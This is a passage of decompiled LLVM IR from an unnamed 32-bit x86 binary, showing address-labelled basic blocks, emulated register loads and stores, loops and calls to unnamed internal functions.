  %v3_8050fe6 = load i32, i32* %v2_8050fe6, align 4
  %v4_8050fe6 = load i32, i32* @ebx, align 4
  %v5_8050fe6 = sub i32 %v3_8050fe6, %v4_8050fe6
  %v11_8050fe6 = xor i32 %v4_8050fe6, %v3_8050fe6
  %v12_8050fe6 = xor i32 %v5_8050fe6, %v3_8050fe6
  %v13_8050fe6 = and i32 %v12_8050fe6, %v11_8050fe6
  %v14_8050fe6 = icmp slt i32 %v13_8050fe6, 0
  %v16_8050fe6 = icmp slt i32 %v5_8050fe6, 0
  %v2_8050fea = icmp eq i1 %v16_8050fe6, %v14_8050fe6
  br i1 %v2_8050fea, label %dec_label_pc_8050ffd, label %dec_label_pc_8050fec

dec_label_pc_8050fec:                             ; preds = %dec_label_pc_8050fae
  %v1_8050fec = add i32 %v0_8050fe3, 60
  %v2_8050fec = inttoptr i32 %v1_8050fec to i32*
  %v3_8050fec = load i32, i32* %v2_8050fec, align 4
  store i32 %v3_8050fec, i32* %edx.global-to-local, align 4
  %v3_8050ff0 = load i32, i32* %v2_8050fe6, align 4
  %v4_8050ff0 = add i32 %v3_8050ff0, 1
  store i32 %v4_8050ff0, i32* %v2_8050fe6, align 4
  %v0_8050ff4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ff4 = load i32, i32* @esp, align 4
  %v2_8050ff4 = add i32 %v1_8050ff4, 56
  %v3_8050ff4 = inttoptr i32 %v2_8050ff4 to i32*
  store i32 %v0_8050ff4, i32* %v3_8050ff4, align 4
  br label %dec_label_pc_8051288.backedge

dec_label_pc_8050ffd:                             ; preds = %dec_label_pc_8050fae, %dec_label_pc_8050fa7
  %v0_8050ffd = call i32 @function_804fe9c()
  store i32 %v0_8050ffd, i32* %eax.global-to-local, align 4
  %v1_8051002 = inttoptr i32 %v0_8050ffd to i32*
  store i32 1, i32* %v1_8051002, align 4
  br label %dec_label_pc_80512c0

dec_label_pc_805100d:                             ; preds = %dec_label_pc_8050f9e
  %v1_805100d = icmp eq i32 %v3_8050f9e, 0
  %v1_805100f = icmp eq i1 %v1_805100d, false
  br i1 %v1_805100f, label %dec_label_pc_805121c, label %dec_label_pc_8051015

dec_label_pc_8051015:                             ; preds = %dec_label_pc_805100d
  %v1_8051015 = add i32 %v0_8050f84, 120
  %v2_8051015 = inttoptr i32 %v1_8051015 to i32*
  %v3_8051015 = load i32, i32* %v2_8051015, align 4
  %tmp48 = icmp slt i32 %v3_8051015, 1
  br i1 %tmp48, label %dec_label_pc_8051025, label %dec_label_pc_805101c

dec_label_pc_805101c:                             ; preds = %dec_label_pc_8051015
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_805104454 = add i32 %v0_8050f84, 116
  %v3_805104455 = inttoptr i32 %v2_805104454 to i32*
  %v4_805104456 = load i32, i32* %v3_805104455, align 4
  %v5_805104457 = sub i32 0, %v4_805104456
  %v13_805104461 = and i32 %v4_805104456, %v5_805104457
  %v14_805104462 = icmp slt i32 %v13_805104461, 0
  %v16_805104464 = icmp slt i32 %v5_805104457, 0
  %v2_805104865 = icmp eq i1 %v16_805104464, %v14_805104462
  br i1 %v2_805104865, label %dec_label_pc_805104a, label %dec_label_pc_8051035

dec_label_pc_8051025:                             ; preds = %dec_label_pc_8051015
  %v0_8051025 = call i32 @function_804fe9c()
  store i32 %v0_8051025, i32* %eax.global-to-local, align 4
  %v1_805102a = inttoptr i32 %v0_8051025 to i32*
  store i32 4, i32* %v1_805102a, align 4
  br label %dec_label_pc_80512c0

dec_label_pc_8051035:                             ; preds = %dec_label_pc_805101c, %dec_label_pc_8051035
  %v0_805104c67 = phi i32 [ %v1_805103f, %dec_label_pc_8051035 ], [ %v1_8050f84, %dec_label_pc_805101c ]
  %v0_805103566 = phi i32 [ %v0_805103a, %dec_label_pc_8051035 ], [ %v3_8050f9e, %dec_label_pc_805101c ]
  %v2_8051035 = add i32 %v0_805104c67, -4
  %v3_8051035 = inttoptr i32 %v2_8051035 to i32*
  store i32 %v0_805103566, i32* %v3_8051035, align 4
  %v0_8051036 = load i32, i32* @ebx, align 4
  %v1_8051036 = add i32 %v0_8051036, 1
  store i32 %v1_8051036, i32* @ebx, align 4
  %v0_8051037 = load i32, i32* @eax, align 4
  %v2_8051037 = add i32 %v0_805104c67, -8
  %v3_8051037 = inttoptr i32 %v2_8051037 to i32*
  store i32 %v0_8051037, i32* %v3_8051037, align 4
  %v0_8051038 = load i32, i32* @esi, align 4
  %v2_8051038 = add i32 %v0_805104c67, -12
  %v3_8051038 = inttoptr i32 %v2_8051038 to i32*
  store i32 %v0_8051038, i32* %v3_8051038, align 4
  %v2_8051039 = add i32 %v0_805104c67, -16
  %v3_8051039 = inttoptr i32 %v2_8051039 to i32*
  store i32 %v1_8050c1a, i32* %v3_8051039, align 4
  %v0_805103a = call i32 @function_80521a4()
  store i32 %v0_805103a, i32* @eax, align 4
  %v0_805103f = load i32, i32* @esp, align 4
  %v1_805103f = add i32 %v0_805103f, 16
  %v0_8051042 = load i32, i32* @esi, align 4
  %v2_8051042 = add i32 %v0_8051042, %v0_805103a
  %v0_8051044.pre = load i32, i32* @ebx, align 4
  store i32 %v2_8051042, i32* @esi, align 4
  %v2_8051044 = add i32 %v0_805103f, 116
  %v3_8051044 = inttoptr i32 %v2_8051044 to i32*
  %v4_8051044 = load i32, i32* %v3_8051044, align 4
  %v5_8051044 = sub i32 %v0_8051044.pre, %v4_8051044
  %v11_8051044 = xor i32 %v4_8051044, %v0_8051044.pre
  %v12_8051044 = xor i32 %v5_8051044, %v0_8051044.pre
  %v13_8051044 = and i32 %v12_8051044, %v11_8051044
  %v14_8051044 = icmp slt i32 %v13_8051044, 0
  %v16_8051044 = icmp slt i32 %v5_8051044, 0
  %v2_8051048 = icmp eq i1 %v16_8051044, %v14_8051044
  br i1 %v2_8051048, label %dec_label_pc_805104a, label %dec_label_pc_8051035

dec_label_pc_805104a:                             ; preds = %dec_label_pc_8051035, %dec_label_pc_805101c
  %v0_805104c.lcssa = phi i32 [ %v1_8050f84, %dec_label_pc_805101c ], [ %v1_805103f, %dec_label_pc_8051035 ]
  store i32 0, i32* @ebx, align 4
  %v1_805104c = add i32 %v0_805104c.lcssa, 27
  %v2_805104c = inttoptr i32 %v1_805104c to i8*
  store i8 1, i8* %v2_805104c, align 1
  %v0_805117a.pre = load i32, i32* @ebx, align 4
  %v1_805117a.pre = load i32, i32* @esp, align 4
  %v2_805117a68 = add i32 %v1_805117a.pre, 104
  %v3_805117a69 = inttoptr i32 %v2_805117a68 to i32*
  %v4_805117a70 = load i32, i32* %v3_805117a69, align 4
  %v5_805117a71 = sub i32 %v0_805117a.pre, %v4_805117a70
  %v11_805117a73 = xor i32 %v4_805117a70, %v0_805117a.pre
  %v12_805117a74 = xor i32 %v5_805117a71, %v0_805117a.pre
  %v13_805117a75 = and i32 %v12_805117a74, %v11_805117a73
  %v14_805117a76 = icmp slt i32 %v13_805117a75, 0
  %v16_805117a78 = icmp slt i32 %v5_805117a71, 0
  %v2_805117e79 = icmp eq i1 %v16_805117a78, %v14_805117a76
  br i1 %v2_805117e79, label %dec_label_pc_805118a, label %dec_label_pc_8051180.lr.ph

dec_label_pc_8051180.lr.ph:                       ; preds = %dec_label_pc_805104a
  %v0_8051180.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051180

dec_label_pc_8051056:                             ; preds = %dec_label_pc_8051180
  %v1_8051056 = add i32 %v0_805105680, 116
  store i32 %v1_8051056, i32* %eax.global-to-local, align 4
  %v2_805105a = add i32 %v0_805105680, -4
  %v3_805105a = inttoptr i32 %v2_805105a to i32*
  store i32 %v1_8051056, i32* %v3_805105a, align 4
  %v3_805105b = load i32, i32* %v3_8051180, align 4
  %v5_805105b = add i32 %v0_805105680, -8
  %v6_805105b = inttoptr i32 %v5_805105b to i32*
  store i32 %v3_805105b, i32* %v6_805105b, align 4
  %v0_805105f = load i32, i32* @esi, align 4
  %v2_805105f = add i32 %v0_805105680, -12
  %v3_805105f = inttoptr i32 %v2_805105f to i32*
  store i32 %v0_805105f, i32* %v3_805105f, align 4
  %v2_8051060 = add i32 %v0_805105680, -16
  %v3_8051060 = inttoptr i32 %v2_8051060 to i32*
  store i32 %v1_8050c1a, i32* %v3_8051060, align 4
  %v0_8051061 = call i32 @function_80521c0()
  store i32 %v0_8051061, i32* @eax, align 4
  %v1_8051066 = load i32, i32* @esp, align 4
  %v2_8051066 = add i32 %v1_8051066, 68
  %v3_8051066 = inttoptr i32 %v2_8051066 to i32*
  store i32 %v0_8051061, i32* %v3_8051066, align 4
  %v0_805106a = load i32, i32* @esp, align 4
  %v1_805106a = add i32 %v0_805106a, 16
  %v2_805106d = icmp slt i32 %v0_8051061, 0
  %v1_805106f = icmp eq i1 %v2_805106d, false
  br i1 %v1_805106f, label %dec_label_pc_8051089, label %dec_label_pc_8051071

dec_label_pc_8051071:                             ; preds = %dec_label_pc_8051056
  %v0_8051071 = load i32, i32* @ebx, align 4
  %v1_8051071 = icmp eq i32 %v0_8051071, 0
  br i1 %v1_8051071, label %dec_label_pc_805121c, label %dec_label_pc_8051079

dec_label_pc_8051079:                             ; preds = %dec_label_pc_8051071
  %v1_8051079 = add i32 %v0_805106a, 100
  %v2_8051079 = inttoptr i32 %v1_8051079 to i32*
  %v3_8051079 = load i32, i32* %v2_8051079, align 4
  %v4_8051079 = icmp eq i32 %v3_8051079, 0
  br i1 %v4_8051079, label %dec_label_pc_805121c, label %dec_label_pc_805118a

dec_label_pc_8051089:                             ; preds = %dec_label_pc_8051056
  %v1_8051089 = add i32 %v0_805106a, 43
  %v2_8051089 = inttoptr i32 %v1_8051089 to i8*
  %v3_8051089 = load i8, i8* %v2_8051089, align 1
  %v4_8051089 = icmp eq i8 %v3_8051089, 0
  br i1 %v4_8051089, label %dec_label_pc_805112a, label %dec_label_pc_8051094

dec_label_pc_8051094:                             ; preds = %dec_label_pc_8051089
  %v0_8051094 = load i32, i32* @edi, align 4
  %v1_8051094 = add i32 %v0_8051094, 28
  %v2_8051094 = inttoptr i32 %v1_8051094 to i32*
  %v3_8051094 = load i32, i32* %v2_8051094, align 4
  store i32 %v3_8051094, i32* %eax.global-to-local, align 4
  %v2_8051097 = add i32 %v0_805106a, 160
  %v3_8051097 = inttoptr i32 %v2_8051097 to i32*
  store i32 %v3_8051094, i32* %v3_8051097, align 4
  %v0_805109e = load i32, i32* @edi, align 4
  %v1_805109e = add i32 %v0_805109e, 32
  %v2_805109e = inttoptr i32 %v1_805109e to i32*
  %v3_805109e = load i32, i32* %v2_805109e, align 4
  store i32 %v3_805109e, i32* %eax.global-to-local, align 4
  %v1_80510a1 = load i32, i32* @esp, align 4
  %v2_80510a1 = add i32 %v1_80510a1, 148
  %v3_80510a1 = inttoptr i32 %v2_80510a1 to i32*
  store i32 %v3_805109e, i32* %v3_80510a1, align 4
  %v0_80510a8 = load i32, i32* @edi, align 4
  %v1_80510a8 = add i32 %v0_80510a8, 36
  %v2_80510a8 = inttoptr i32 %v1_80510a8 to i32*
  %v3_80510a8 = load i32, i32* %v2_80510a8, align 4
  store i32 %v3_80510a8, i32* %eax.global-to-local, align 4
  %v1_80510ab = load i32, i32* @esp, align 4
  %v2_80510ab = add i32 %v1_80510ab, 152
  %v3_80510ab = inttoptr i32 %v2_80510ab to i32*
  store i32 %v3_80510a8, i32* %v3_80510ab, align 4
  %v0_80510b2 = load i32, i32* @ecx, align 4
  %v1_80510b2 = load i32, i32* @esp, align 4
  %v2_80510b2 = add i32 %v1_80510b2, -4
  %v3_80510b2 = inttoptr i32 %v2_80510b2 to i32*
  store i32 %v0_80510b2, i32* %v3_80510b2, align 4
  %v1_80510b3 = add i32 %v1_80510b2, -8
  %v2_80510b3 = inttoptr i32 %v1_80510b3 to i32*
  store i32 40, i32* %v2_80510b3, align 4
  %v1_80510b5 = add i32 %v1_80510b2, 116
  store i32 %v1_80510b5, i32* %edx.global-to-local, align 4
  %v2_80510b9 = add i32 %v1_80510b2, -12
  %v3_80510b9 = inttoptr i32 %v2_80510b9 to i32*
  store i32 %v1_80510b5, i32* %v3_80510b9, align 4
  %v0_80510ba = load i32, i32* @edi, align 4
  %v2_80510ba = add i32 %v1_80510b2, -16
  %v3_80510ba = inttoptr i32 %v2_80510ba to i32*
  store i32 %v0_80510ba, i32* %v3_80510ba, align 4
  %v4_80510bb = call i32 @function_804d4b8(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80510bb, i32* %eax.global-to-local, align 4
  %v0_80510c0 = load i32, i32* @edi, align 4
  %v1_80510c0 = add i32 %v0_80510c0, 4
  %v2_80510c0 = inttoptr i32 %v1_80510c0 to i32*
  %v3_80510c0 = load i32, i32* %v2_80510c0, align 4
  store i32 %v3_80510c0, i32* %eax.global-to-local, align 4
  %v0_80510c3 = load i32, i32* @esp, align 4
  %v1_80510c3 = add i32 %v0_80510c3, 16
  %v9_80510c6 = icmp eq i32 %v3_80510c0, 24
  br i1 %v9_80510c6, label %dec_label_pc_8051094.dec_label_pc_80510ed_crit_edge, label %dec_label_pc_80510cb

dec_label_pc_8051094.dec_label_pc_80510ed_crit_edge: ; preds = %dec_label_pc_8051094
  %.pre24 = add i32 %v0_80510c3, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_80510ed.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_80510ed

dec_label_pc_80510cb:                             ; preds = %dec_label_pc_8051094
  %v1_80510cb = add i32 %v0_80510c0, 28
  %v2_80510cb = inttoptr i32 %v1_80510cb to i32*
  %v3_80510cb = load i32, i32* %v2_80510cb, align 4
  %v4_80510cb = icmp eq i32 %v3_80510cb, 0
  br i1 %v4_80510cb, label %dec_label_pc_805118a, label %dec_label_pc_80510d5

dec_label_pc_80510d5:                             ; preds = %dec_label_pc_80510cb
  %v1_80510d5 = add i32 %v0_80510c3, 260
  %v2_80510d5 = inttoptr i32 %v1_80510d5 to i32*
  %v3_80510d5 = load i32, i32* %v2_80510d5, align 4
  %v12_80510d5 = icmp eq i32 %v3_80510d5, 1
  br i1 %v12_80510d5, label %dec_label_pc_80510ed, label %dec_label_pc_80510df

dec_label_pc_80510df:                             ; preds = %dec_label_pc_80510d5
  %v12_80510df = icmp eq i32 %v3_80510d5, 28
  %v1_80510e7 = icmp eq i1 %v12_80510df, false
  br i1 %v1_80510e7, label %dec_label_pc_805118a, label %dec_label_pc_80510ed

dec_label_pc_80510ed:                             ; preds = %dec_label_pc_8051094.dec_label_pc_80510ed_crit_edge, %dec_label_pc_80510df, %dec_label_pc_80510d5
  %v4_80510ed = phi i32 [ %v4_80510ed.pre, %dec_label_pc_8051094.dec_label_pc_80510ed_crit_edge ], [ %v3_80510d5, %dec_label_pc_80510df ], [ %v3_80510d5, %dec_label_pc_80510d5 ]
  %v15_80510ed = icmp eq i32 %v3_80510c0, %v4_80510ed
  br i1 %v15_80510ed, label %dec_label_pc_8051102, label %dec_label_pc_80510f6

dec_label_pc_80510f6:                             ; preds = %dec_label_pc_80510ed
  %v1_80510f9 = inttoptr i32 %v0_80510c0 to i32*
  %v2_80510f9 = load i32, i32* %v1_80510f9, align 4
  %v5_80510f9 = inttoptr i32 %v0_80510c3 to i32*
  store i32 %v2_80510f9, i32* %v5_80510f9, align 4
  %v1_80510fb = call i32 @function_804eac9(i32 -1)
  store i32 %v1_80510fb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051172

dec_label_pc_8051102:                             ; preds = %dec_label_pc_80510ed
  %v0_8051102 = load i32, i32* @ebx, align 4
  %v1_8051104 = sub i32 -1, %v0_8051102
  store i32 %v1_8051104, i32* %eax.global-to-local, align 4
  %v2_8051106 = add i32 %v0_80510c3, 120
  %v3_8051106 = inttoptr i32 %v2_8051106 to i32*
  %v4_8051106 = load i32, i32* %v3_8051106, align 4
  %v5_8051106 = add i32 %v4_8051106, %v1_8051104
  store i32 %v5_8051106, i32* %eax.global-to-local, align 4
  %v2_805110a = add i32 %v0_80510c0, 36
  %v3_805110a = inttoptr i32 %v2_805110a to i32*
  store i32 %v5_8051106, i32* %v3_805110a, align 4
  %v0_805110d = load i32, i32* @edi, align 4
  %v1_805110d = add i32 %v0_805110d, 16
  %v2_805110d = inttoptr i32 %v1_805110d to i32*
  %v3_805110d = load i32, i32* %v2_805110d, align 4
  %v1_8051110 = add i32 %v3_805110d, 4
  store i32 %v1_8051110, i32* %eax.global-to-local, align 4
  %v2_8051113 = add i32 %v0_805110d, 36
  %v3_8051113 = inttoptr i32 %v2_8051113 to i32*
  %v4_8051113 = load i32, i32* %v3_8051113, align 4
  %v7_8051113 = mul i32 %v4_8051113, %v1_8051110
  store i32 %v7_8051113, i32* %eax.global-to-local, align 4
  %v2_8051117 = add i32 %v0_805110d, 32
  %v3_8051117 = inttoptr i32 %v2_8051117 to i32*
  %v4_8051117 = load i32, i32* %v3_8051117, align 4
  %v6_805111a = icmp ugt i32 %v7_8051113, %v4_8051117
  br i1 %v6_805111a, label %dec_label_pc_8051102.dec_label_pc_805118a.loopexit_crit_edge, label %dec_label_pc_805111c

dec_label_pc_8051102.dec_label_pc_805118a.loopexit_crit_edge: ; preds = %dec_label_pc_8051102
  %v0_805118a.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805118a

dec_label_pc_805111c:                             ; preds = %dec_label_pc_8051102
  store i32 0, i32* %v3_8051113, align 4
  %v0_8051123 = load i32, i32* @esp, align 4
  %v1_8051123 = add i32 %v0_8051123, 27
  %v2_8051123 = inttoptr i32 %v1_8051123 to i8*
  store i8 0, i8* %v2_8051123, align 1
  %v1_8051175.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051175

dec_label_pc_805112a:                             ; preds = %dec_label_pc_8051089
  %v1_805112d = add i32 %v0_805106a, 132
  %v2_805112d = inttoptr i32 %v1_805112d to i32*
  %v3_805112d = load i32, i32* %v2_805112d, align 4
  %v6_805112d = inttoptr i32 %v0_805106a to i32*
  store i32 %v3_805112d, i32* %v6_805112d, align 4
  %v1_8051134 = call i32 @function_804eac9(i32 -1)
  store i32 %v1_8051134, i32* %eax.global-to-local, align 4
  %v0_8051139 = load i32, i32* @esp, align 4
  %v1_8051139 = add i32 %v0_8051139, 16
  %v1_805113c = add i32 %v0_8051139, 260
  %v2_805113c = inttoptr i32 %v1_805113c to i32*
  %v3_805113c = load i32, i32* %v2_805113c, align 4
  store i32 %v3_805113c, i32* %eax.global-to-local, align 4
  %v1_8051143 = add i32 %v0_8051139, 136
  %v2_8051143 = inttoptr i32 %v1_8051143 to i32*
  %v3_8051143 = load i32, i32* %v2_8051143, align 4
  %v15_8051143 = icmp eq i32 %v3_8051143, %v3_805113c
  %v1_8051147 = icmp eq i1 %v15_8051143, false
  br i1 %v1_8051147, label %dec_label_pc_8051175, label %dec_label_pc_8051149

dec_label_pc_8051149:                             ; preds = %dec_label_pc_805112a
  %v0_8051149 = load i32, i32* @edi, align 4
  %v1_8051149 = add i32 %v0_8051149, 16
  %v2_8051149 = inttoptr i32 %v1_8051149 to i32*
  %v3_8051149 = load i32, i32* %v2_8051149, align 4
  store i32 %v3_8051149, i32* %eax.global-to-local, align 4
  %v2_805114c = add i32 %v0_8051139, 148
  %v3_805114c = inttoptr i32 %v2_805114c to i32*
  %v4_805114c = load i32, i32* %v3_805114c, align 4
  %v15_805114c = icmp eq i32 %v3_8051149, %v4_805114c
  %v1_8051153 = icmp eq i1 %v15_805114c, false
  br i1 %v1_8051153, label %dec_label_pc_805120f, label %dec_label_pc_8051159

dec_label_pc_8051159:                             ; preds = %dec_label_pc_8051149
  %v0_8051159 = load i32, i32* @edx, align 4
  %v2_8051159 = add i32 %v0_8051139, 12
  %v3_8051159 = inttoptr i32 %v2_8051159 to i32*
  store i32 %v0_8051159, i32* %v3_8051159, align 4
  %v0_805115a = load i32, i32* %eax.global-to-local, align 4
  %v2_805115a = add i32 %v0_8051139, 8
  %v3_805115a = inttoptr i32 %v2_805115a to i32*
  store i32 %v0_805115a, i32* %v3_805115a, align 4
  %v1_805115b = add i32 %v0_8051139, 152
  %v2_805115b = inttoptr i32 %v1_805115b to i32*
  %v3_805115b = load i32, i32* %v2_805115b, align 4
  %v5_805115b = add i32 %v0_8051139, 4
  %v6_805115b = inttoptr i32 %v5_805115b to i32*
  store i32 %v3_805115b, i32* %v6_805115b, align 4
  %v0_8051162 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051162 = load i32, i32* @edi, align 4
  %v2_8051162 = add i32 %v1_8051162, 36
  %v3_8051162 = inttoptr i32 %v2_8051162 to i32*
  %v4_8051162 = load i32, i32* %v3_8051162, align 4
  %v7_8051162 = mul i32 %v4_8051162, %v0_8051162
  store i32 %v7_8051162, i32* %eax.global-to-local, align 4
  %v2_8051166 = add i32 %v1_8051162, 28
  %v3_8051166 = inttoptr i32 %v2_8051166 to i32*
  %v4_8051166 = load i32, i32* %v3_8051166, align 4
  %v5_8051166 = add i32 %v4_8051166, %v7_8051162
  store i32 %v5_8051166, i32* %eax.global-to-local, align 4
  %v3_8051169 = inttoptr i32 %v0_8051139 to i32*
  store i32 %v5_8051166, i32* %v3_8051169, align 4
  %v4_805116a = call i32 @function_804d4b8(i16* inttoptr (i32 -1 to i16*), i32 %v15_8050ca8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805116a, i32* %eax.global-to-local, align 4
  %v0_805116f = load i32, i32* @edi, align 4
  %v1_805116f = add i32 %v0_805116f, 36
  %v2_805116f = inttoptr i32 %v1_805116f to i32*
  %v3_805116f = load i32, i32* %v2_805116f, align 4
  %v4_805116f = add i32 %v3_805116f, 1
  store i32 %v4_805116f, i32* %v2_805116f, align 4
  br label %dec_label_pc_8051172

dec_label_pc_8051172:                             ; preds = %dec_label_pc_80510f6, %dec_label_pc_8051159
  %v0_8051172 = load i32, i32* @esp, align 4
  %v1_8051172 = add i32 %v0_8051172, 16
  br label %dec_label_pc_8051175

dec_label_pc_8051175:                             ; preds = %dec_label_pc_805112a, %dec_label_pc_805111c, %dec_label_pc_8051172
  %v1_8051175 = phi i32 [ %v1_8051139, %dec_label_pc_805112a ], [ %v1_8051175.pre, %dec_label_pc_805111c ], [ %v1_8051172, %dec_label_pc_8051172 ]
  %v0_8051175 = load i32, i32* @esi, align 4
  %v2_8051175 = add i32 %v1_8051175, 52
  %v3_8051175 = inttoptr i32 %v2_8051175 to i32*
  %v4_8051175 = load i32, i32* %v3_8051175, align 4
  %v5_8051175 = add i32 %v4_8051175, %v0_8051175
  store i32 %v5_8051175, i32* @esi, align 4
  %v0_8051179 = load i32, i32* @ebx, align 4
  %v1_8051179 = add i32 %v0_8051179, 1
  store i32 %v1_8051179, i32* @ebx, align 4
  %v2_805117a = add i32 %v1_8051175, 104
  %v3_805117a = inttoptr i32 %v2_805117a to i32*
  %v4_805117a = load i32, i32* %v3_805117a, align 4
  %v5_805117a = sub i32 %v1_8051179, %v4_805117a
  %v11_805117a = xor i32 %v4_805117a, %v1_8051179
  %v12_805117a = xor i32 %v5_805117a, %v1_8051179
  %v13_805117a = and i32 %v12_805117a, %v11_805117a
  %v14_805117a = icmp slt i32 %v13_805117a, 0
  %v16_805117a = icmp slt i32 %v5_805117a, 0
  %v2_805117e = icmp eq i1 %v16_805117a, %v14_805117a
  br i1 %v2_805117e, label %dec_label_pc_805118a, label %dec_label_pc_8051180

dec_label_pc_8051180:                             ; preds = %dec_label_pc_8051180.lr.ph, %dec_label_pc_8051175
  %v0_8051180 = phi i32 [ %v0_8051180.pre, %dec_label_pc_8051180.lr.ph ], [ %v5_8051175, %dec_label_pc_8051175 ]
  %v0_805105680 = phi i32 [ %v1_805117a.pre, %dec_label_pc_8051180.lr.ph ], [ %v1_8051175, %dec_label_pc_8051175 ]
  %v2_8051180 = add i32 %v0_805105680, 16
  %v3_8051180 = inttoptr i32 %v2_8051180 to i32*
  %v4_8051180 = load i32, i32* %v3_8051180, align 4
  %v5_8051180 = sub i32 %v0_8051180, %v4_8051180
  %v11_8051180 = xor i32 %v4_8051180, %v0_8051180
  %v12_8051180 = xor i32 %v5_8051180, %v0_8051180
  %v13_8051180 = and i32 %v12_8051180, %v11_8051180
  %v14_8051180 = icmp slt i32 %v13_8051180, 0
  %v16_8051180 = icmp slt i32 %v5_8051180, 0
  %v2_8051184 = icmp eq i1 %v16_8051180, %v14_8051180
  br i1 %v2_8051184, label %dec_label_pc_805118a, label %dec_label_pc_8051056

dec_label_pc_805118a:                             ; preds = %dec_label_pc_8051079, %dec_label_pc_805104a, %dec_label_pc_8051175, %dec_label_pc_80510cb, %dec_label_pc_80510df, %dec_label_pc_8051180, %dec_label_pc_8051102.dec_label_pc_805118a.loopexit_crit_edge
  %v0_805118a = phi i32 [ %v0_805118a.pre.pre, %dec_label_pc_8051102.dec_label_pc_805118a.loopexit_crit_edge ], [ %v1_805117a.pre, %dec_label_pc_805104a ], [ %v1_8051175, %dec_label_pc_8051175 ], [ %v1_80510c3, %dec_label_pc_80510cb ], [ %v1_80510c3, %dec_label_pc_80510df ], [ %v0_805105680, %dec_label_pc_8051180 ], [ %v1_805106a, %dec_label_pc_8051079 ]
  %v1_805118d = add i32 %v0_805118a, 20
  %v2_805118d = inttoptr i32 %v1_805118d to i32*
  %v3_805118d = load i32, i32* %v2_805118d, align 4
  %v5_805118d = add i32 %v0_805118a, -16
  %v6_805118d = inttoptr i32 %v5_805118d to i32*
  store i32 %v3_805118d, i32* %v6_805118d, align 4
  %v1_8051191 = call i32 @function_804b7d8(i32 -1)
  store i32 %v1_8051191, i32* %eax.global-to-local, align 4
  %v0_8051196 = load i32, i32* @esp, align 4
  %v1_8051199 = add i32 %v0_8051196, 272
  %v2_8051199 = inttoptr i32 %v1_8051199 to i32*
  %v3_8051199 = load i32, i32* %v2_8051199, align 4
  %v4_8051199 = icmp eq i32 %v3_8051199, 0
  br i1 %v4_8051199, label %dec_label_pc_80511ae, label %dec_label_pc_80511a3

dec_label_pc_80511a3:                             ; preds = %dec_label_pc_805118a
  store i32 %v3_8051199, i32* %edx.global-to-local, align 4
  %v2_80511aa = inttoptr i32 %v3_8051199 to i32*
  store i32 %v1_8050c1a, i32* %v2_80511aa, align 4
  %v0_80511ba.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80511ba

dec_label_pc_80511ae:                             ; preds = %dec_label_pc_805118a
  %v3_80511b1 = inttoptr i32 %v0_8051196 to i32*
  store i32 %v1_8050c1a, i32* %v3_80511b1, align 4
  %v1_80511b2 = call i32 @function_804eac9(i32 -1)
  store i32 %v1_80511b2, i32* %eax.global-to-local, align 4
  %v0_80511b7 = load i32, i32* @esp, align 4
  %v1_80511b7 = add i32 %v0_80511b7, 16
  br label %dec_label_pc_80511ba

dec_label_pc_80511ba:                             ; preds = %dec_label_pc_80511a3, %dec_label_pc_80511ae
  %v0_80511ba = phi i32 [ %v0_80511ba.pre, %dec_label_pc_80511a3 ], [ %v1_80511b7, %dec_label_pc_80511ae ]
  %v1_80511bd = add i32 %v0_80511ba, 12
  %v2_80511bd = inttoptr i32 %v1_80511bd to i32*
  %v3_80511bd = load i32, i32* %v2_80511bd, align 4
  %v5_80511bd = add i32 %v0_80511ba, -16
  %v6_80511bd = inttoptr i32 %v5_80511bd to i32*
  store i32 %v3_80511bd, i32* %v6_80511bd, align 4
  %v1_80511c1 = call i32 @function_804eac9(i32 -1)
  store i32 %v1_80511c1, i32* @eax, align 4
  %v0_80511c6 = load i32, i32* @esp, align 4
  %v1_80511c9 = add i32 %v0_80511c6, 8
  %v2_80511c9 = inttoptr i32 %v1_80511c9 to i32*
  store i32 ptrtoint (i32* @global_var_8058b28.194 to i32), i32* %v2_80511c9, align 4
  %v1_80511ce = add i32 %v0_80511c6, 4
  %v2_80511ce = inttoptr i32 %v1_80511ce to i32*
  store i32 134542939, i32* %v2_80511ce, align 4
  %v1_80511d3 = add i32 %v0_80511c6, 200
  store i32 %v1_80511d3, i32* %ebx.global-to-local, align 4
  %v3_80511da = inttoptr i32 %v0_80511c6 to i32*
  store i32 %v1_80511d3, i32* %v3_80511da, align 4
  %v2_80511db = call i32 @function_804f65e(i32 -1, i32 %v15_8050ca8)
  store i32 %v2_80511db, i32* %eax.global-to-local, align 4
  %v0_80511e0 = load i32, i32* @esp, align 4
  %v1_80511e0 = inttoptr i32 %v0_80511e0 to i32*
  store i32 ptrtoint (i32* @global_var_8058b28.194 to i32), i32* %v1_80511e0, align 4
  %v1_80511e7 = call i32 @function_804f65b(i32 -1)
  store i32 %v1_80511e7, i32* %eax.global-to-local, align 4
  %v0_80511ec = load i32, i32* @esp, align 4
  %v1_80511ec = add i32 %v0_80511ec, 56
  %v2_80511ec = inttoptr i32 %v1_80511ec to i32*
  %v3_80511ec = load i32, i32* %v2_80511ec, align 4
  store i32 %v3_80511ec, i32* @eax, align 4
  %v1_80511f0 = add i32 %v0_80511ec, 60
  %v2_80511f0 = inttoptr i32 %v1_80511f0 to i32*
  %v3_80511f0 = load i32, i32* %v2_80511f0, align 4
  store i32 %v3_80511f0, i32* %edx.global-to-local, align 4
  %v1_80511f4 = inttoptr i32 %v0_80511ec to i32*
  %v3_80511f4 = add i32 %v0_80511ec, 4
  %v1_80511f5 = inttoptr i32 %v3_80511f4 to i32*
  %v1_80511f6 = sext i32 %v3_80511ec to i64
  store i64 %v1_80511f6, i64* @global_var_8058b40.195, align 64
  %v1_80511fb = trunc i32 %v3_80511f0 to i16
  store i16 %v1_80511fb, i16* @global_var_805644c.196, align 4
  store i32 1, i32* %v1_80511f5, align 4
  %v0_8051204 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051204, i32* %v1_80511f4, align 4
